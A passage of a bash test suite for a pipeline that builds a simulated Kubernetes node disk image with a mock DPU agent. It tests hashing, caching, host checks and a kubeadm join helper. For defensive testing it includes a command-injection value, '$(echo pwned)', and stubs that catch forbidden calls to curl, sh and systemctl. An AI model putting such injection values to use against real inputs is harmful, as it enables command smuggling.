          /work*) out+="${work}"; rest="${rest#/work}" ;;
          *) out+="${rest:0:1}"; rest="${rest:1}" ;;
        esac
      done
      printf "%s" "${out}"
    }
    translated=()
    for arg in ${cmd[@]+"${cmd[@]}"}; do
      translated+=("$(to_host "${arg}")")
    done
    # Environment carries container paths too, such as the staged mock-dpuagent
    # binary, so it needs the same translation as the command.
    translated_envs=()
    for env_pair in ${envs[@]+"${envs[@]}"}; do
      translated_envs+=("$(to_host "${env_pair}")")
    done
    exec env ${translated_envs[@]+"${translated_envs[@]}"} "${translated[@]}"
    ;;
esac'
	write_fake qemu-img '
echo "qemu-img $*" >>"${CALLS:-/dev/null}"
if [ "${1:-}" = create ]; then
  : >"${4}"
elif [ "${1:-}" = convert ]; then
  : >"${5}"
fi'
	write_fake virt-customize 'echo "virt-customize $*" >>"${CALLS:-/dev/null}"'
	write_fake virt-resize 'echo "virt-resize $*" >>"${CALLS:-/dev/null}"'
	write_fake virt-sparsify 'echo "virt-sparsify $*" >>"${CALLS:-/dev/null}"'
	write_fake virt-sysprep 'echo "virt-sysprep $*" >>"${CALLS:-/dev/null}"'
	write_fake uname '
case "${1:-}" in
  -s) echo "${FAKE_UNAME_S:-Linux}" ;;
  -m) echo "${FAKE_UNAME_M:-x86_64}" ;;
esac'
	write_guestfish
	write_dpuagent_bin
}

run_build() {
	local script="${1:-./build.sh}"
	shift || true
	(
		cd "${ROOT}"
		# SIMFLEET_KVM=off keeps the expected docker arguments the same whether or
		# not the machine running these tests has /dev/kvm.
		env PATH="${TMP}/bin:${PATH}" CALLS="${CALLS}" WORK="${WORK}" \
			BASE_IMAGE="example.invalid/ubuntu@sha256:test" NODE_IMG="test-node:local" \
			SIMFLEET_KVM=off DPUAGENT_BIN="${TMP}/mock-dpuagent" \
			"$@" "${script}"
	)
}

# run_source_hash pins the inputs a hash needs so each case can vary exactly
# one of them. Later assignments win, so callers override by appending.
run_source_hash() {
	local script="$1"
	shift
	env BASE_IMAGE=base@sha256:one DPUAGENT_BIN="${TMP}/mock-dpuagent" \
		SIMFLEET_MOCK_REF="${ROOT}/../../hack/dpuagent/mock.ref" \
		"$@" "${script}"
}

test_source_hash() {
	local first second
	write_dpuagent_bin
	first="$(run_source_hash "${ROOT}/source-hash.sh")"
	second="$(run_source_hash "${ROOT}/source-hash.sh")"
	test "${first}" = "${second}" || fail "source hash is not stable"
	assert_matches '^[0-9a-f]{64}$' <(printf '%s\n' "${first}")

	second="$(run_source_hash "${ROOT}/source-hash.sh" BASE_IMAGE=base@sha256:two)"
	test "${first}" != "${second}" || fail "source hash ignores BASE_IMAGE"
	second="$(run_source_hash "${ROOT}/source-hash.sh" DISK_SIZE=20G)"
	test "${first}" != "${second}" || fail "source hash ignores DISK_SIZE"
	second="$(run_source_hash "${ROOT}/source-hash.sh" KUBE_APT_VERSION=9.99.9-9.9)"
	test "${first}" != "${second}" || fail "source hash ignores KUBE_APT_VERSION"
	second="$(run_source_hash "${ROOT}/source-hash.sh" IMAGE_VERSION=v9.9.9)"
	test "${first}" != "${second}" || fail "source hash ignores IMAGE_VERSION"

	# The agent is guest content: its bytes and the commit it came from both
	# have to invalidate a cached image.
	write_dpuagent_bin "${TMP}/other-mock-dpuagent" "a different mock-dpuagent"
	second="$(run_source_hash "${ROOT}/source-hash.sh" \
		DPUAGENT_BIN="${TMP}/other-mock-dpuagent")"
	test "${first}" != "${second}" || fail "source hash ignores the mock-dpuagent binary"

	# The provenance has to be hack/dpuagent/mock.ref, which is what
	# hack/dpuagent/build.sh actually checks out. The controller's go.mod pin of
	# doca-platform is a different thing entirely: it can move without the
	# mock moving, and the mock can move without it.
	local doctored="${TMP}/doctored-mock.ref"
	printf '%s\n' ffffffffffffffffffffffffffffffffffffffff > "${doctored}"
	second="$(run_source_hash "${ROOT}/source-hash.sh" SIMFLEET_MOCK_REF="${doctored}")"
	test "${first}" != "${second}" || fail "source hash ignores hack/dpuagent/mock.ref"

	# A hash can never be produced from a partial view of the guest.
	if run_source_hash "${ROOT}/source-hash.sh" \
		DPUAGENT_BIN="${TMP}/absent-mock-dpuagent" > "${TMP}/hash-missing.out" 2>&1; then
		fail "source-hash.sh produced a hash without the mock-dpuagent binary"
	fi
	assert_contains 'mock-dpuagent binary not found' "${TMP}/hash-missing.out"
	if run_source_hash "${ROOT}/source-hash.sh" \
		SIMFLEET_MOCK_REF=/dev/null > "${TMP}/hash-nopin.out" 2>&1; then
		fail "source-hash.sh produced a hash without the mock-dpuagent pin"
	fi
	assert_contains 'does not pin a mock-dpuagent commit' "${TMP}/hash-nopin.out"

	# The hashed record has to name the commit the mock was built from, so the
	# provenance a built image carries is a revision that produced it rather
	# than a version that has nothing to do with it.
	assert_contains 'mock-ref=' "${ROOT}/source-hash.sh"
	if grep -q 'dpf-version=' "${ROOT}/source-hash.sh"; then
		fail "source-hash.sh still records the go.mod DPF version as mock provenance"
	fi

	# A recipe edit has to invalidate the hash, or CI would reuse a stale image.
	local copy="${TMP}/recipe-copy"
	mkdir -p "${copy}"
	cp -R "${ROOT}/." "${copy}/"
	second="$(run_source_hash "${copy}/source-hash.sh")"
	test "${first}" = "${second}" \
		|| fail "source hash depends on the recipe directory path"
	printf '\n# edited\n' >> "${copy}/guest/install.sh"
	second="$(run_source_hash "${copy}/source-hash.sh")"
	test "${first}" != "${second}" || fail "source hash ignores guest/install.sh"
	local guest_file
	for guest_file in guest/mock-dpuagent.service guest/wait-kubelet-join.sh \
		guest/wait-kubelet-join.service guest/10-flannel.conflist; do
		cp -R "${ROOT}/." "${copy}/"
		printf '\n# edited\n' >> "${copy}/${guest_file}"
		second="$(run_source_hash "${copy}/source-hash.sh")"
		test "${first}" != "${second}" || fail "source hash ignores ${guest_file}"
	done
}

test_build_orchestration() {
	CALLS="${TMP}/build.calls"
	WORK="${TMP}/work"
	mkdir -p "${WORK}"
	: > "${CALLS}"
	write_build_host

	run_build > "${TMP}/build.out" 2>&1 || {
		cat "${TMP}/build.out" >&2
		fail "build.sh failed against the stand-in build host"
	}

	assert_contains 'docker create --platform linux/amd64 example.invalid/ubuntu@sha256:test' "${CALLS}"
	assert_contains "docker cp test-container:/disk/disk.img ${WORK}/base.img" "${CALLS}"
	assert_contains "qemu-img convert -O qcow2 ${WORK}/base.img ${WORK}/disk.img" "${CALLS}"
	assert_contains "qemu-img resize ${WORK}/disk.img 10G" "${CALLS}"
	assert_contains 'guestfish request part-expand-gpt /dev/sda' "${CALLS}"
	assert_contains 'guestfish request part-resize /dev/sda 1 20971486' "${CALLS}"
	assert_contains 'guestfish request resize2fs /dev/sda1' "${CALLS}"
	assert_contains "virt-sparsify --in-place ${WORK}/disk.img" "${CALLS}"
	assert_contains 'virt-customize -a' "${CALLS}"
	assert_contains "KUBE_APT_VERSION='1.36.4-1.1' /tmp/install.sh" "${CALLS}"
	# The agent binary lives outside the recipe, so it is staged into the work
	# mount and copied from there.
	assert_contains "--copy-in ${WORK}/mock-dpuagent:/opt/dpf" "${CALLS}"
	assert_contains "--copy-in ${ROOT}/guest/10-flannel.conflist:/etc/cni/net.d" "${CALLS}"
	assert_contains "--copy-in ${ROOT}/guest/wait-kubelet-join.sh:/opt/dpf" "${CALLS}"
	# Vendor path, so a disabled fleet can mask them from /etc. See
	# customize-disk.sh for why /etc is the one place these must not go.
	assert_contains "--copy-in ${ROOT}/guest/mock-dpuagent.service:/usr/lib/systemd/system" "${CALLS}"
	assert_contains "--copy-in ${ROOT}/guest/wait-kubelet-join.service:/usr/lib/systemd/system" "${CALLS}"
	assert_contains '--run-command systemctl enable mock-dpuagent.service' "${CALLS}"
	assert_contains '--run-command systemctl enable wait-kubelet-join.service' "${CALLS}"
	assert_contains 'chmod 0755 /opt/dpf/mock-dpuagent /opt/dpf/wait-kubelet-join.sh' "${CALLS}"
	assert_contains 'virt-sysprep -a' "${CALLS}"
	assert_absent 'virt-resize' "${CALLS}"
	assert_absent 'growpart' "${CALLS}"
	assert_absent '--install cloud-guest-utils' "${CALLS}"
	assert_matches "docker build --platform linux/amd64 -t test-node:local --label com\.nvidia\.simfleet\.node-source-hash=[0-9a-f]{64} --label com\.nvidia\.simfleet\.kubernetes\.version=v1\.36\.4 -f ${ROOT}/Dockerfile ${WORK}/context" "${CALLS}"
	assert_absent 'org.opencontainers.image.version' "${CALLS}"
	assert_matches '^docker run .* sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ' \
		"${CALLS}"
	assert_not_matches '^docker run .* simfleet-node-builder:local( |$)' "${CALLS}"
	assert_contains 'fake docker builder output' "${TMP}/build.out"
	test -f "${WORK}/context/disk.img" || fail "build context has no disk.img"
	test ! -e "${WORK}/base.img" || fail "build left the extracted base image behind"
	test ! -e "${WORK}/builder.iid" || fail "build left the builder IID file behind"
}

test_build_requires_dpuagent_binary() {
	CALLS="${TMP}/agent-missing.calls"
	WORK="${TMP}/agent-missing-work"
	mkdir -p "${WORK}"
	: > "${CALLS}"
	write_build_host

	if run_build ./build.sh DPUAGENT_BIN="${TMP}/absent-mock-dpuagent" \
		> "${TMP}/agent-missing.out" 2>&1; then
		fail "build.sh built an image without the mock-dpuagent binary"
	fi
	assert_contains 'mock-dpuagent binary not found' "${TMP}/agent-missing.out"
	assert_contains 'make dpuagent-build' "${TMP}/agent-missing.out"
	# It has to fail before spending a base-image pull on a build that cannot
	# finish.
	assert_absent 'docker create' "${CALLS}"

	# customize-disk.sh runs in the builder, where a lost binary means a broken
	# build.sh rather than a user error, so it fails on its own too.
	if (
		cd "${ROOT}" \
			&& env PATH="${TMP}/bin:${PATH}" CALLS="${CALLS}" DPUAGENT_BIN="" \
				./customize-disk.sh "${TMP}/base.img" "${TMP}/out.img"
	) > "${TMP}/customize-missing.out" 2>&1; then
		fail "customize-disk.sh customized a disk without the mock-dpuagent binary"
	fi
	assert_contains 'mock-dpuagent binary not found' "${TMP}/customize-missing.out"
	assert_contains 'make dpuagent-build' \
		"${TMP}/customize-missing.out"
}

test_build_stamps_release_version() {
	CALLS="${TMP}/version.calls"
	WORK="${TMP}/version-work"
	mkdir -p "${WORK}"
	: > "${CALLS}"
	write_build_host

	run_build ./build.sh IMAGE_VERSION=v0.2.0
	assert_contains '--label org.opencontainers.image.version=v0.2.0' "${CALLS}"
}

test_build_requires_linux_amd64() {
	CALLS="${TMP}/host.calls"
	WORK="${TMP}/host-work"
	: > "${CALLS}"
	write_build_host

	if run_build ./build.sh FAKE_UNAME_S=Darwin > "${TMP}/darwin.out" 2>&1; then
		fail "build.sh accepted a non-Linux host"
	fi
	assert_contains 'require a Linux amd64 host' "${TMP}/darwin.out"
	if run_build ./build.sh FAKE_UNAME_M=aarch64 > "${TMP}/arm.out" 2>&1; then
		fail "build.sh accepted a non-amd64 host"
	fi
	assert_contains 'require a Linux amd64 host' "${TMP}/arm.out"
	assert_absent 'docker create' "${CALLS}"
}

# The disk stages moved into the builder image, so the container tool is the
# only thing the host still has to provide. Requiring host libguestfs here
# would reject every CI runner we have.
test_host_guard_requires_every_tool() {
	write_build_host
	local bash_binary guard_bin tool
	bash_binary="$(command -v bash)"
	guard_bin="${TMP}/guard-bin"

	for tool in docker; do
		rm -rf "${guard_bin}"
		mkdir -p "${guard_bin}"
		cp "${TMP}"/bin/* "${guard_bin}/"
		# The stand-ins are #!/usr/bin/env bash scripts, so bash itself has to stay
		# reachable even though nothing else does.
		ln -sf "${bash_binary}" "${guard_bin}/bash"
		rm -f "${guard_bin}/${tool}"
		# Only the stand-ins are reachable, so a tool absent here is absent to the
		# guard no matter what the host running these tests has installed.
		if PATH="${guard_bin}" "${bash_binary}" -c \
			'. "$1/lib.sh"; simfleet_require_host docker' _ "${ROOT}" \
			> "${TMP}/missing-tool.out" 2>&1; then
			fail "the host guard accepted a host without ${tool}"
		fi
		assert_contains "required command not found: ${tool}" "${TMP}/missing-tool.out"
	done

	# A host without libguestfs is fine: that is the whole point of the builder
	# image, and the CI runners are exactly such hosts.
	rm -rf "${guard_bin}"
	mkdir -p "${guard_bin}"
	cp "${TMP}/bin/docker" "${TMP}/bin/uname" "${guard_bin}/"
	ln -sf "${bash_binary}" "${guard_bin}/bash"
	ln -sf "$(command -v id)" "${guard_bin}/id"
	PATH="${guard_bin}" "${bash_binary}" -c \
		'. "$1/lib.sh"; simfleet_require_host docker' _ "${ROOT}" \
		> "${TMP}/no-libguestfs.out" 2>&1 \
		|| fail "the host guard rejected a host that only has a container tool"
}

test_check_host_script() {
	write_build_host
	local calls="${TMP}/check-host.calls"
	: > "${calls}"
	(
		env PATH="${TMP}/bin:${PATH}" CALLS="${calls}" SIMFLEET_KVM=off \
			"${ROOT}/check-host.sh"
	) > "${TMP}/check-host.out" 2>&1 || fail "check-host.sh rejected a usable host"
	assert_contains 'build host looks usable' "${TMP}/check-host.out"
	assert_matches '^docker run .* sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ' \
		"${calls}"
	assert_not_matches '^docker run .* simfleet-node-builder:local( |$)' "${calls}"
	assert_contains 'fake docker builder output' "${TMP}/check-host.out"

	if (
		env PATH="${TMP}/bin:${PATH}" FAKE_UNAME_S=Darwin "${ROOT}/check-host.sh"
	) > "${TMP}/check-host-darwin.out" 2>&1; then
		fail "check-host.sh accepted a non-Linux host"
	fi
	assert_contains 'require a Linux amd64 host' "${TMP}/check-host-darwin.out"
}

test_build_rejects_invalid_builder_iid() {
	CALLS="${TMP}/invalid-iid.calls"
	WORK="${TMP}/invalid-iid-work"
	mkdir -p "${WORK}"
	: > "${CALLS}"
	write_build_host

	if run_build ./build.sh FAKE_BUILDER_IID=sha256:builder-test-id \
		> "${TMP}/invalid-iid.out" 2>&1; then
		fail "build.sh accepted an invalid builder image ID"
	fi
	assert_contains 'builder returned invalid image ID: sha256:builder-test-id' \
		"${TMP}/invalid-iid.out"
	assert_absent 'docker run' "${CALLS}"
	test ! -e "${WORK}/builder.iid" || fail "invalid build left the builder IID file behind"
}

test_check_host_rejects_empty_builder_iid_and_cleans_up() {
	write_build_host
	local calls="${TMP}/empty-iid.calls"
	local temp_root="${TMP}/check-host-tmp"
	mkdir -p "${temp_root}"
	: > "${calls}"

	if env PATH="${TMP}/bin:${PATH}" CALLS="${calls}" SIMFLEET_KVM=off \
		FAKE_BUILDER_IID= TMPDIR="${temp_root}" "${ROOT}/check-host.sh" \
		> "${TMP}/empty-iid.out" 2>&1; then
		fail "check-host.sh accepted an empty builder image ID"
	fi
	assert_contains 'builder returned invalid image ID: <empty>' "${TMP}/empty-iid.out"
	assert_absent 'docker run' "${calls}"
	if compgen -G "${temp_root}/*" > /dev/null; then
		fail "check-host.sh left temporary IID state behind"
	fi
}

# The builder image can exist and still not boot an appliance, which is how
# the first real CI run failed (ten minutes in, with no diagnosis).
# check-host.sh has to boot it once, using the same flags a build uses.
test_check_host_rejects_unusable_libguestfs() {
	write_build_host
	if (
		env PATH="${TMP}/bin:${PATH}" SIMFLEET_KVM=off FAKE_GUESTFISH_FAIL_ON=run \
			"${ROOT}/check-host.sh"
	) > "${TMP}/check-host-broken.out" 2>&1; then
		fail "check-host.sh accepted a host where libguestfs cannot start"
	fi
	assert_contains 'libguestfs cannot start its appliance in simfleet-node-builder:local' \
		"${TMP}/check-host-broken.out"
}

# When the appliance fails inside the container the cause is the container's
# environment, so the pipeline has to print what that looks like rather than
# just the libguestfs error.
test_customize_reports_libguestfs_diagnostics() {
	write_build_host
	local work="${TMP}/diag-work"
	mkdir -p "${work}"
	: > "${work}/base.img"
	if (
		cd "${ROOT}"
		env PATH="${TMP}/bin:${PATH}" FAKE_GUESTFISH_FAIL_ON=inspect-os \
			DPUAGENT_BIN="${TMP}/mock-dpuagent" \
			./customize-disk.sh "${work}/base.img" "${work}/disk.img"
	) > "${TMP}/diag.out" 2>&1; then
		fail "customize-disk.sh continued after libguestfs failed"
	fi
	assert_contains 'Diagnostics:' "${TMP}/diag.out"
	assert_contains 'Most likely fixes, on the build host:' "${TMP}/diag.out"
	grep -q 'kernel' "${TMP}/diag.out" \
		|| fail "customize-disk.sh did not report kernel readability"
	grep -q '/dev/kvm' "${TMP}/diag.out" \
		|| fail "customize-disk.sh did not report /dev/kvm access"
}

test_build_fails_when_root_does_not_grow() {
	CALLS="${TMP}/grow.calls"
	WORK="${TMP}/grow-work"
	: > "${CALLS}"
	write_build_host

	if run_build ./build.sh FAKE_ROOT_BLOCKS=500000 > "${TMP}/grow.out" 2>&1; then
		fail "build.sh accepted a root filesystem that did not grow"
	fi
	assert_contains 'expected at least' "${TMP}/grow.out"
	assert_absent 'virt-customize' "${CALLS}"
}

test_build_fails_when_resize_renumbers_root() {
	CALLS="${TMP}/renumber.calls"
	WORK="${TMP}/renumber-work"
	: > "${CALLS}"
	write_build_host

	if run_build ./build.sh FAKE_GROWN_ROOT_DEVICE=/dev/sda4 \
		> "${TMP}/renumber.out" 2>&1; then
		fail "build.sh accepted a resize that renumbered the root partition"
	fi
	assert_contains 'root partition changed from /dev/sda1 to /dev/sda4' \
		"${TMP}/renumber.out"
	assert_absent 'virt-customize' "${CALLS}"
}

# A real 10G build measures ~86% of the disk, not ~100%: the disk keeps the
# base image's BIOS, ESP, and boot partitions and statvfs does not count ext4
# metadata. A stricter threshold looks reasonable and fails every real build,
# which is exactly what happened the first time this ran on CI.
test_growth_threshold_accepts_a_real_build() {
	CALLS="${TMP}/real-grow.calls"
	WORK="${TMP}/real-grow-work"
	: > "${CALLS}"
	write_build_host

	# 2266392 4K blocks is what the runner reported for a 10G disk.
	run_build ./build.sh FAKE_ROOT_BLOCKS=2266392 > "${TMP}/real-grow.out" 2>&1 \
		|| fail "build.sh rejected the root filesystem size a real 10G build produces"
	assert_contains 'virt-customize' "${CALLS}"
}

test_container_cleanup_after_extraction_failure() {
	CALLS="${TMP}/cleanup-extract.calls"
	WORK="${TMP}/cleanup-extract-work"
	: > "${CALLS}"
	write_build_host
	write_fake docker '
echo "docker $*" >>"${CALLS:-/dev/null}"
case "$1" in
  create) echo extraction-container ;;
  cp) exit 42 ;;
esac'

	if run_build > "${TMP}/cleanup-extract.out" 2>&1; then
		fail "build.sh accepted an extraction failure"
	fi
	assert_contains 'docker rm extraction-container' "${CALLS}"
}

test_container_cleanup_before_customization_failure() {
	CALLS="${TMP}/cleanup-customize.calls"
	WORK="${TMP}/cleanup-customize-work"
	: > "${CALLS}"
	write_build_host
	write_fake docker '
echo "docker $*" >>"${CALLS:-/dev/null}"
case "$1" in
  create) echo customize-container ;;
  cp) : >"${3}" ;;
esac'
	write_fake virt-customize 'exit 43'

	if run_build > "${TMP}/cleanup-customize.out" 2>&1; then
		fail "build.sh accepted a customization failure"
	fi
	assert_contains 'docker rm customize-container' "${CALLS}"
}

test_cached_build_reuses_matching_source_hash() {
	CALLS="${TMP}/cache-hit.calls"
	WORK="${TMP}/cache-hit-work"
	: > "${CALLS}"
	write_build_host
	local expected
	expected="$(run_source_hash "${ROOT}/source-hash.sh" \
		BASE_IMAGE="example.invalid/ubuntu@sha256:test")"

	run_build ./build-cached.sh FAKE_CACHED_HASH="${expected}" \
		> "${TMP}/cache-hit.out" 2>&1 \
		|| fail "build-cached.sh failed on a cache hit"
	assert_contains "Reusing test-node:local" "${TMP}/cache-hit.out"
	assert_absent 'docker create' "${CALLS}"
	assert_absent 'docker build' "${CALLS}"
}

test_cached_build_rebuilds_on_recipe_change() {
	CALLS="${TMP}/cache-miss.calls"
	WORK="${TMP}/cache-miss-work"
	: > "${CALLS}"
	write_build_host

	run_build ./build-cached.sh \
		FAKE_CACHED_HASH=0000000000000000000000000000000000000000000000000000000000000000 \
		> "${TMP}/cache-miss.out" 2>&1 \
		|| fail "build-cached.sh failed on a cache miss"
	assert_contains 'Rebuilding test-node:local' "${TMP}/cache-miss.out"
	assert_contains 'docker build' "${CALLS}"
}

test_cached_build_rebuilds_on_image_version_change() {
	CALLS="${TMP}/cache-version.calls"
	WORK="${TMP}/cache-version-work"
	: > "${CALLS}"
	write_build_host
	local unversioned_hash
	unversioned_hash="$(run_source_hash "${ROOT}/source-hash.sh" \
		BASE_IMAGE="example.invalid/ubuntu@sha256:test")"

	run_build ./build-cached.sh FAKE_CACHED_HASH="${unversioned_hash}" \
		IMAGE_VERSION=v9.9.9 > "${TMP}/cache-version.out" 2>&1 \
		|| fail "build-cached.sh failed on an IMAGE_VERSION cache miss"
	assert_contains 'Rebuilding test-node:local' "${TMP}/cache-version.out"
	assert_contains '--label org.opencontainers.image.version=v9.9.9' "${CALLS}"
}

test_cached_build_never_trusts_a_bare_tag() {
	CALLS="${TMP}/cache-bare.calls"
	WORK="${TMP}/cache-bare-work"
	: > "${CALLS}"
	write_build_host
	# An image built before the label existed inspects successfully but has no
	# source hash. That must rebuild, not skip.
	run_build ./build-cached.sh FAKE_CACHED_HASH= \
		> "${TMP}/cache-bare.out" 2>&1 \
		|| fail "build-cached.sh failed without a cached source hash"
	assert_contains 'no cached image with a source hash' "${TMP}/cache-bare.out"
	assert_contains 'docker build' "${CALLS}"
}

# join_helper_env stages a guest root for the join helper and returns the
# environment that points the script at it. Each case gets its own directory
# so a leftover kubelet.conf cannot make a later case pass.
join_helper_env() {
	local case_name="$1"
	local root="${TMP}/join/${case_name}"
	rm -rf "${root}"
	mkdir -p "${root}/bin" "${root}/etc"
	printf 'DPU_NAME=e2e-fleet-host-0000-e2e-fleet-device-000000\nDPU_NAMESPACE=dpf-operator-system\n' \
		> "${root}/etc/identity.env"
	printf 'apiVersion: v1\nkind: Config\n' > "${root}/etc/mgmt.kubeconfig"
	# kubectl serves the two reads the helper makes: the DPU's UID, phase and
	# KubeletConfigured status, and one combined Secret read carrying both the
	# owner references and the base64 .data.join. Each is separately
	# controllable so a case can make exactly one of them hostile.
	# FAKE_DPU_STATES answers the Nth DPU read with its Nth "phase|status" line,
	# repeating the last one, and "absent" stands for a DPU that is not there.
	# FAKE_SWAPPED_JOIN_COMMAND answers every read after the first with
	# different bytes, which is how a case proves the helper only ever reads
	# the Secret once.
	cat > "${root}/bin/kubectl" << 'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'kubectl %s\n' "$*" >>"${JOIN_CALLS}"
case "$*" in
  *"get dpu "*)
    state="DPU Cluster Config|True"
    if [ -n "${FAKE_DPU_STATES:-}" ]; then
      dpu_reads_file="${JOIN_CALLS}.dpu-reads"
      printf 'x' >>"${dpu_reads_file}"
      dpu_reads="$(wc -c <"${dpu_reads_file}" | tr -d ' ')"
      state="$(printf '%s\n' "${FAKE_DPU_STATES}" | sed -n "${dpu_reads}p")"
      if [ -z "${state}" ]; then
        state="$(printf '%s\n' "${FAKE_DPU_STATES}" | tail -n 1)"
      fi
    fi
    if [ -z "${FAKE_DPU_UID:-}" ] || [ "${state}" = absent ]; then
      echo "dpus.provisioning.dpu.nvidia.com not found" >&2
      exit 1
    fi
    printf '%s|%s' "${FAKE_DPU_UID}" "${state}"
    ;;
  *"get secret "*)
    if [ -z "${FAKE_SECRET_RESPONSE:-}" ]; then
      echo "secrets not found" >&2
      exit 1
    fi
    reads_file="${JOIN_CALLS}.secret-reads"
    printf 'x' >>"${reads_file}"
    join_command="${FAKE_JOIN_COMMAND:-}"
    if [ "$(wc -c <"${reads_file}" | tr -d ' ')" -gt 1 ] &&
      [ -n "${FAKE_SWAPPED_JOIN_COMMAND:-}" ]; then
      join_command="${FAKE_SWAPPED_JOIN_COMMAND}"
    fi
    printf '%s\n' "${FAKE_SECRET_RESPONSE}"
    printf 'join=%s\n' "$(printf '%s' "${join_command}" | base64 | tr -d '\n')"
    ;;
  *)
    echo "unexpected kubectl invocation: $*" >&2
    exit 2
    ;;
esac
EOF
	# kubeadm records the argument vector it was handed, one argument per line,
	# so a case can prove nothing was word-split or re-interpreted.
	cat > "${root}/bin/kubeadm" << 'EOF'
#!/usr/bin/env bash
set -euo pipefail
printf 'kubeadm-arg %s\n' "$@" >>"${JOIN_CALLS}"
EOF
	# Any command the helper is forbidden to reach records itself instead.
	local forbidden
	for forbidden in systemctl curl sh; do
		cat > "${root}/bin/${forbidden}" << EOF
#!/usr/bin/env bash
printf '${forbidden} %s\n' "\$*" >>"\${JOIN_CALLS}"
EOF
	done
	chmod +x "${root}"/bin/*
	printf '%s\n' "${root}"
}

# The identity cloud-init writes, and the DPU that identity names.
readonly JOIN_DPU_NAME="e2e-fleet-host-0000-e2e-fleet-device-000000"
readonly JOIN_DPU_UID="11111111-2222-3333-4444-555555555555"
# The exact template output the helper asks the API for: a secret= line
# proving existence, then the fixed verdict token once per owner reference
# that the API server itself matched against the DPU. No owner field value is
# ever echoed, which is what makes the verdict unforgeable. The join= record
# is appended last by the fake, as the API emits it.
readonly JOIN_SECRET_OWNER_MATCH="dpu-owner-match"
readonly JOIN_SECRET_RESPONSE="secret=${JOIN_DPU_NAME}-kubeadm-join
${JOIN_SECRET_OWNER_MATCH}"
readonly VALID_JOIN_COMMAND="kubeadm join 10.1.2.3:6443 --token abcdef.0123456789abcdef --v=5 --discovery-token-ca-cert-hash sha256:0000000000000000000000000000000000000000000000000000000000000000"

# run_join_helper runs the guest script against a staged root. Defaults come
# first so a case's own assignments override them.
run_join_helper() {
	local root="$1"
	shift
	(
		: > "${root}/proc-config.gz"
		env PATH="${root}/bin:${PATH}" JOIN_CALLS="${root}/calls" \
			IDENTITY_FILE="${root}/etc/identity.env" \
			MGMT_KUBECONFIG="${root}/etc/mgmt.kubeconfig" \
			KUBELET_CONF="${root}/etc/kubelet.conf" \
			KERNEL_CONFIG_PROC="${root}/proc-config.gz" \
			JOIN_ATTEMPTS=2 JOIN_INTERVAL=0 \
			"FAKE_DPU_UID=${JOIN_DPU_UID}" \
			"FAKE_SECRET_RESPONSE=${JOIN_SECRET_RESPONSE}" \
			"$@" "${ROOT}/guest/wait-kubelet-join.sh"
	) > "${root}/out" 2>&1
}

# test_join_args_hook checks append_image_join_args without running the join loop.
# The body is a subshell, so sourcing the helper cannot replace fail() or any
# other function or variable of this shell.
test_join_args_hook() (
	local hook_tmp="${TMP}/join-args-hook"
	rm -rf "${hook_tmp}"
	mkdir -p "${hook_tmp}"

	source_join_hook() {
		# shellcheck disable=SC1090
		WAIT_KUBELET_JOIN_SOURCE_ONLY=1 \
			source "${ROOT}/guest/wait-kubelet-join.sh"
	}

	JOIN_ARGS_FILE="${hook_tmp}/missing.args"
	source_join_hook
	join_argv=(kubeadm join 10.0.0.1:6443 --token abcdef.0123456789abcdef)
	append_image_join_args
	test "${#join_argv[@]}" -eq 5 \
		|| fail "missing join args file changed join_argv length (got ${#join_argv[@]})"
	test "${join_argv[0]}" = kubeadm \
		&& test "${join_argv[4]}" = abcdef.0123456789abcdef \
		|| fail "missing join args file changed join_argv contents"

	printf '%s\n' \
		'--patches=/usr/lib/dpf-sim/kubeadm-patches' \
		'--v=2' > "${hook_tmp}/present.args"
	JOIN_ARGS_FILE="${hook_tmp}/present.args"
	source_join_hook
	join_argv=(kubeadm join 10.0.0.1:6443 --token abcdef.0123456789abcdef)
	append_image_join_args
	test "${#join_argv[@]}" -eq 7 \
		|| fail "present join args file: expected 7 argv entries, got ${#join_argv[@]}"
	test "${join_argv[5]}" = '--patches=/usr/lib/dpf-sim/kubeadm-patches' \
		|| fail "first appended join arg missing or out of order"
	test "${join_argv[6]}" = '--v=2' \
		|| fail "second appended join arg missing or out of order"

	printf '%s\n' '$(echo pwned)' > "${hook_tmp}/literal.args"
	JOIN_ARGS_FILE="${hook_tmp}/literal.args"
	source_join_hook
	join_argv=(kubeadm join 10.0.0.1:6443 --token abcdef.0123456789abcdef)
	append_image_join_args
	test "${#join_argv[@]}" -eq 6 \
		|| fail "literal join arg: expected 6 argv entries, got ${#join_argv[@]}"
	test "${join_argv[5]}" = '$(echo pwned)' \
		|| fail "join arg line was interpreted instead of appended literally"

	printf '\n--v=3\n\n--v=4\n' > "${hook_tmp}/blank-lines.args"
	JOIN_ARGS_FILE="${hook_tmp}/blank-lines.args"
	source_join_hook
	join_argv=(kubeadm join 10.0.0.1:6443 --token abcdef.0123456789abcdef)
	append_image_join_args
	test "${#join_argv[@]}" -eq 7 \
		|| fail "blank lines: expected 7 argv entries, got ${#join_argv[@]}"
	test "${join_argv[5]}" = '--v=3' \
		&& test "${join_argv[6]}" = '--v=4' \
		|| fail "blank lines were not skipped"
)

# test_kernel_config_for_kubeadm checks that a guest with no kernel config
# gains /boot/config-$(uname -r) before kubeadm join, and that an existing
# config is left alone.
test_kernel_config_for_kubeadm() (
	local dir="${TMP}/kernel-config"
	rm -rf "${dir}"
	mkdir -p "${dir}"
	# shellcheck disable=SC1090
	WAIT_KUBELET_JOIN_SOURCE_ONLY=1 source "${ROOT}/guest/wait-kubelet-join.sh"

	KERNEL_CONFIG_PROC="${dir}/missing-proc-config.gz" \
		KERNEL_CONFIG_FILE="${dir}/boot/config-test" \
		ensure_kernel_config
	[ -f "${dir}/boot/config-test" ] || fail "ensure_kernel_config did not write a kernel config"
	grep -q '^CONFIG_NAMESPACES=y$' "${dir}/boot/config-test" \
		|| fail "written kernel config is missing CONFIG_NAMESPACES"
	grep -q '^CONFIG_CGROUP_BPF=y$' "${dir}/boot/config-test" \
		|| fail "written kernel config is missing CONFIG_CGROUP_BPF"

	printf '%s\n' 'CONFIG_NAMESPACES=n' > "${dir}/boot/config-test"
	KERNEL_CONFIG_PROC="${dir}/missing-proc-config.gz" \
		KERNEL_CONFIG_FILE="${dir}/boot/config-test" \
		ensure_kernel_config
	grep -q '^CONFIG_NAMESPACES=n$' "${dir}/boot/config-test" \
		|| fail "ensure_kernel_config rewrote an existing kernel config"

	printf '%s\n' 'present' > "${dir}/proc-config.gz"
